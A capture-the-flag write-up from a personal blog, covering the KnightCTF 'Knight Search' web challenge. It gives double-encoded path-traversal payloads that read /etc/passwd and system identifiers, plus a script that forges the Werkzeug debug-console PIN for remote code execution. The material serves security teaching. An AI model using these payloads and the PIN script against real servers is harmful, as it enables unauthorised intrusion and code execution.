<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>KnightCTF : Knight Search | Sanlokii</title>
<meta name=keywords content="Web,Write-up"><meta name=description content="Web"><meta name=author content><link rel=canonical href=https://sanlokii.eu/writeups/knightctf/knight-search/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://sanlokii.eu/assets/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sanlokii.eu/assets/images/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sanlokii.eu/assets/imagesfavicon-32x32.png><link rel=apple-touch-icon href=https://sanlokii.eu/assets/images/apple-touch-icon.png><link rel=mask-icon href=https://sanlokii.eu/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sanlokii.eu/writeups/knightctf/knight-search/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="KnightCTF : Knight Search"><meta property="og:description" content="Web"><meta property="og:type" content="article"><meta property="og:url" content="https://sanlokii.eu/writeups/knightctf/knight-search/"><meta property="og:image" content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-01-22T16:01:53+01:00"><meta property="article:modified_time" content="2023-01-22T16:01:53+01:00"><meta property="og:site_name" content="Sanlokii's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta name=twitter:title content="KnightCTF : Knight Search"><meta name=twitter:description content="Web"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://sanlokii.eu/writeups/"},{"@type":"ListItem","position":2,"name":"KnightCTF : Knight Search","item":"https://sanlokii.eu/writeups/knightctf/knight-search/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"KnightCTF : Knight Search","name":"KnightCTF : Knight Search","description":"Web","keywords":["Web","Write-up"],"articleBody":"Statement:\nOne of my college friend is learning web-dev with Flask . One day he showed me his very first website for file searching. But he did a mistake. And somehow I managed to break into his website. Now can you spot the mistake and help him to secure his site?\nDemo Flag: KCTF{Fl4g_H3r3}\nhttp://167.99.8.90:7777/\nBy visiting the website, I can see the presence of a search field : During a search, a POST request is made on the filename parameter :\nPOST /home HTTP/1.1 Host: 167.99.8.90:7777 Content-Length: 10 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://167.99.8.90:7777 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://167.99.8.90:7777/home Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close filename=x When trying to get an invalid path with GET request, I get the following page with error messages :\nIn the error messages, I can read the following source code :\nif __name__ == \"__main__\": app.run(host='0.0.0.0', port=7777 , debug=True) The rendering of the error page and the messages indicate that the site runs under python with debug set to true.\nI decide to check the headers returned by the site to know the versions used : curl -I http://167.99.8.90:7777\nHTTP/1.1 200 OK Server: Werkzeug/2.2.2 Python/3.9.16 Date: Sun, 22 Jan 2023 15:56:37 GMT Content-Type: text/html; charset=utf-8 Content-Length: 1116 Connection: close With this information, a request on the endpoint /console should redirect me to a debug console but this one is protected via PIN authentication : It is possible to calculate the PIN by retrieving some metrics, for that I would have to find a LFI. Probably via a POST request on the /home endpoint !\nA simple search on app.py returns the source code : Here is the source code once beautifying :\nfrom flask import Flask, request, render_template, current_app import os, urllib app = Flask(__name__) @app.route(\"/\") def start(): return render_template(\"index.html\") @app.route(\"/home\", methods=['POST']) def home(): filename = urllib.parse.unquote(request.form['filename']) data = \"Try Harder.....\" naughty = \"../\" if naughty not in filename: filename = urllib.parse.unquote(filename) if os.path.isfile(current_app.root_path + '/'+ filename): with current_app.open_resource(filename) as f: data = f.read() return render_template(\"index.html\", read = data) @app.errorhandler(404) def ahhhh(e): return render_template(\"ahhh.html\") if __name__ == \"__main__\": app.run(host='0.0.0.0', port=7777 , debug=True) By reading the source code, we know the following points :\nFilter on ../ Positionned on the root directory of the application + / With this information, a multiple encoding should allow to exploit a LFI.\nI will try to get the file /etc/passwd with double encoding :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd Now I need to retrieve the following information to generate the PIN code :\nusername modname getattr(app, '__name__', getattr(app.__class__, '__name__')) getattr(mod, '__file__', None) str(uuid.getnode()) machine-id I know already some values :\nusername value from /etc/passwd : yooboi modname : flask.app getattr(app, '__name__', getattr(app.__class__, '__name__')) : Flask I find getattr(mod, '__file__', None) value from the traceback page : For str(uuid.getnode()) value, I get the file /proc/net/arp through LFI :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fproc%252Fnet%252Farp Now I know I can get the file linked to eth0 /sys/class/net/eth0/address :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fsys%252Fclass%252Fnet%252Feth0%252Faddress I convert MAC adress to decimal expression :\n\u003e\u003e\u003e print(0x0242ac110003) 2485377892355 And the latest value machine-id from /proc/sys/kernel/random/boot_id :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fproc%252Fsys%252Fkernel%252Frandom%252Fboot_id I’ve to adapt the script with our values :\nimport hashlib from itertools import chain probably_public_bits = [ 'yooboi',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '2485377892355',# str(uuid.getnode()), /sys/class/net/ens33/address 'e01d426f-826c-4736-9cd2-a96608b66fd8'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') #h.update(b'shittysalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) I get back the value 276-444-173 but this PIN code didn’t unlock the access to the console.\nFrom that moment, my team and I were stuck on this challenge.\nLater, we found this resource that specifies the following point :\nNewer versions of Werkzeug use SHA1 instead of MD5\nAll that was left was to modify the script to use SHA1 :\nh = hashlib.sha1() #h = hashlib.md5() I get the following PIN code : 695-086-043 and this one unlock the access to the console.\nOnce access to the console, it is possible to RCE via a python shell : Flag: KCTF{n3v3r_run_y0ur_53rv3r_0n_d3bu6_m0d3}\nWe were a little frustrated to not finish it in time, but the challenge was interesting.\n","wordCount":"753","inLanguage":"en","datePublished":"2023-01-22T16:01:53+01:00","dateModified":"2023-01-22T16:01:53+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanlokii.eu/writeups/knightctf/knight-search/"},"publisher":{"@type":"Organization","name":"Sanlokii","logo":{"@type":"ImageObject","url":"https://sanlokii.eu/assets/images/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sanlokii.eu/ accesskey=h title="Sanlokii (Alt + H)"><img src=https://sanlokii.eu/assets/images/apple-touch-icon.png alt aria-label=logo height=40>Sanlokii</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://sanlokii.eu/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://sanlokii.eu/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://sanlokii.eu/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sanlokii.eu/>Home</a>&nbsp;»&nbsp;<a href=https://sanlokii.eu/writeups/>Writeups</a></div><h1 class="post-title entry-hint-parent">KnightCTF : Knight Search</h1><div class=post-description>Web</div><div class=post-meta><span title='2023-01-22 16:01:53 +0100 +0100'>January 22, 2023</span>&nbsp;·&nbsp;4 min</div></header><div class=post-content><p><strong>Statement:</strong></p><p>One of my college friend is learning web-dev with Flask . One day he showed me his very first website for file searching. But he did a mistake. And somehow I managed to break into his website. Now can you spot the mistake and help him to secure his site?</p><p>Demo Flag: KCTF{Fl4g_H3r3}</p><p><code>http://167.99.8.90:7777/</code></p><hr><p>By visiting the website, I can see the presence of a search field :
<img loading=lazy src=/assets/images/writeups/knight_search.png alt=knight></p><p>During a search, a POST request is made on the <code>filename</code> parameter :</p><pre tabindex=0><code>POST /home HTTP/1.1
Host: 167.99.8.90:7777
Content-Length: 10
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://167.99.8.90:7777
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://167.99.8.90:7777/home
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

filename=x
</code></pre><p>When trying to get an invalid path with GET request, I get the following page with error messages :</p><p><img loading=lazy src=/assets/images/writeups/knight_search1.png#center alt=knight1></p><p>In the error messages, I can read the following source code :</p><pre tabindex=0><code>if __name__ == &#34;__main__&#34;:
   app.run(host=&#39;0.0.0.0&#39;, port=7777 , debug=True)
</code></pre><p>The rendering of the error page and the messages indicate that the site runs under python with debug set to true.</p><p>I decide to check the headers returned by the site to know the versions used : <code>curl -I http://167.99.8.90:7777</code></p><pre tabindex=0><code>HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.9.16
Date: Sun, 22 Jan 2023 15:56:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1116
Connection: close
</code></pre><p>With this information, a request on the endpoint <code>/console</code> should redirect me to a debug console but this one is protected via PIN authentication :
<img loading=lazy src=/assets/images/writeups/knight_search2.png#center alt=knight2></p><p>It is possible to <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug>calculate the PIN by retrieving some metrics</a>, for that I would have to find a LFI.
Probably via a POST request on the <code>/home</code> endpoint !</p><p>A simple search on <code>app.py</code> returns the source code :
<img loading=lazy src=/assets/images/writeups/knight_search3.png#center alt=knight3></p><p>Here is the source code once beautifying :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, render_template, current_app 
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os<span style=color:#f92672>,</span> urllib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>) 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/home&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>]) 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home</span>():
</span></span><span style=display:flex><span>    filename <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;filename&#39;</span>])
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Try Harder.....&#34;</span>
</span></span><span style=display:flex><span>    naughty <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;../&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> naughty <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> filename:
</span></span><span style=display:flex><span>        filename <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>unquote(filename)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>isfile(current_app<span style=color:#f92672>.</span>root_path <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>+</span> filename):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> current_app<span style=color:#f92672>.</span>open_resource(filename) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>             data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read() 
</span></span><span style=display:flex><span>             <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>, read <span style=color:#f92672>=</span> data)
</span></span><span style=display:flex><span>             
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.errorhandler</span>(<span style=color:#ae81ff>404</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ahhhh</span>(e):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;ahhh.html&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>7777</span> , debug<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span></code></pre></div><p>By reading the source code, we know the following points :</p><ul><li>Filter on <code>../</code></li><li>Positionned on the root directory of the application + <code>/</code></li></ul><p>With this information, a multiple encoding should allow to exploit a LFI.</p><p>I will try to get the file <code>/etc/passwd</code> with double encoding :</p><pre tabindex=0><code>%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
</code></pre><p><img loading=lazy src=/assets/images/writeups/knight_search4.png#center alt=knight4></p><p>Now I need to retrieve the following information to generate the PIN code :</p><ul><li><code>username</code></li><li><code>modname</code></li><li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code></li><li><code>getattr(mod, '__file__', None)</code></li><li><code>str(uuid.getnode())</code></li><li><code>machine-id</code></li></ul><p>I know already some values :</p><ul><li><code>username</code> value from <code>/etc/passwd</code> : yooboi</li><li><code>modname</code> : flask.app</li><li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> : Flask</li></ul><p>I find <code>getattr(mod, '__file__', None)</code> value from the traceback page :
<img loading=lazy src=/assets/images/writeups/knight_search5.png#center alt=knight5></p><p>For <code>str(uuid.getnode())</code> value, I get the file <code>/proc/net/arp</code> through LFI :</p><pre tabindex=0><code>%252E%252E%252F%252E%252E%252F%252E%252E%252Fproc%252Fnet%252Farp
</code></pre><p><img loading=lazy src=/assets/images/writeups/knight_search6.png#center alt=knight6></p><p>Now I know I can get the file linked to eth0 <code>/sys/class/net/eth0/address</code> :</p><pre tabindex=0><code>%252E%252E%252F%252E%252E%252F%252E%252E%252Fsys%252Fclass%252Fnet%252Feth0%252Faddress
</code></pre><p><img loading=lazy src=/assets/images/writeups/knight_search7.png#center alt=knight7></p><p>I convert MAC adress to decimal expression :</p><pre tabindex=0><code>&gt;&gt;&gt; print(0x0242ac110003)
2485377892355
</code></pre><p>And the latest value <code>machine-id</code> from <code>/proc/sys/kernel/random/boot_id</code> :</p><pre tabindex=0><code>%252E%252E%252F%252E%252E%252F%252E%252E%252Fproc%252Fsys%252Fkernel%252Frandom%252Fboot_id
</code></pre><p><img loading=lazy src=/assets/images/writeups/knight_search8.png#center alt=knight8></p><p>I&rsquo;ve to adapt the script with our values :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> itertools <span style=color:#f92672>import</span> chain
</span></span><span style=display:flex><span>probably_public_bits <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;yooboi&#39;</span>,<span style=color:#75715e># username</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;flask.app&#39;</span>,<span style=color:#75715e># modname</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Flask&#39;</span>,<span style=color:#75715e># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;/usr/local/lib/python3.9/site-packages/flask/app.py&#39;</span> <span style=color:#75715e># getattr(mod, &#39;__file__&#39;, None),</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>private_bits <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;2485377892355&#39;</span>,<span style=color:#75715e># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;e01d426f-826c-4736-9cd2-a96608b66fd8&#39;</span><span style=color:#75715e># get_machine_id(), /etc/machine-id</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>h <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5()
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> bit <span style=color:#f92672>in</span> chain(probably_public_bits, private_bits):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> bit:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> isinstance(bit, str):
</span></span><span style=display:flex><span>        bit <span style=color:#f92672>=</span> bit<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    h<span style=color:#f92672>.</span>update(bit)
</span></span><span style=display:flex><span>h<span style=color:#f92672>.</span>update(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;cookiesalt&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>#h.update(b&#39;shittysalt&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cookie_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;__wzd&#39;</span> <span style=color:#f92672>+</span> h<span style=color:#f92672>.</span>hexdigest()[:<span style=color:#ae81ff>20</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>num <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> num <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    h<span style=color:#f92672>.</span>update(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;pinsalt&#39;</span>)
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>%09d</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> int(h<span style=color:#f92672>.</span>hexdigest(), <span style=color:#ae81ff>16</span>))[:<span style=color:#ae81ff>9</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rv <span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> rv <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> group_size <span style=color:#f92672>in</span> <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>3</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(num) <span style=color:#f92672>%</span> group_size <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            rv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;-&#39;</span><span style=color:#f92672>.</span>join(num[x:x <span style=color:#f92672>+</span> group_size]<span style=color:#f92672>.</span>rjust(group_size, <span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>                          <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(num), group_size))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        rv <span style=color:#f92672>=</span> num
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(rv)
</span></span></code></pre></div><p>I get back the value <strong>276-444-173</strong> but this PIN code didn&rsquo;t unlock the access to the console.</p><p>From that moment, my team and I were stuck on this challenge.</p><p>Later, we found <a href=https://github.com/wdahlenburg/werkzeug-debug-console-bypass>this resource</a> that specifies the following point :</p><blockquote><p>Newer versions of Werkzeug use SHA1 instead of MD5</p></blockquote><p>All that was left was to modify the script to use SHA1 :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>h <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>sha1()
</span></span><span style=display:flex><span><span style=color:#75715e>#h = hashlib.md5()</span>
</span></span></code></pre></div><p>I get the following PIN code : <strong>695-086-043</strong> and this one unlock the access to the console.</p><p>Once access to the console, it is possible to RCE via a python shell :
<img loading=lazy src=/assets/images/writeups/knight_search9.png#center alt=knight9></p><p>Flag: <code>KCTF{n3v3r_run_y0ur_53rv3r_0n_d3bu6_m0d3}</code></p><p>We were a little frustrated to not finish it in time, but the challenge was interesting.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sanlokii.eu/tags/web/>Web</a></li><li><a href=https://sanlokii.eu/tags/write-up/>Write-Up</a></li></ul><nav class=paginav><a class=prev href=https://sanlokii.eu/writeups/insomnihack/welcome/><span class=title>« Prev</span><br><span>Insomni'hack Teaser : Welcome</span>
</a><a class=next href=https://sanlokii.eu/writeups/downunderctf/dfir-investigation-1/><span class=title>Next »</span><br><span>DownUnderCTF : DFIR Investigation 1</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share KnightCTF : Knight Search on x" href="https://x.com/intent/tweet/?text=KnightCTF%20%3a%20Knight%20Search&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2fknightctf%2fknight-search%2f&amp;hashtags=Web%2cWrite-up"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share KnightCTF : Knight Search on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2fknightctf%2fknight-search%2f&amp;title=KnightCTF%20%3a%20Knight%20Search&amp;summary=KnightCTF%20%3a%20Knight%20Search&amp;source=https%3a%2f%2fsanlokii.eu%2fwriteups%2fknightctf%2fknight-search%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://sanlokii.eu/>Sanlokii</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>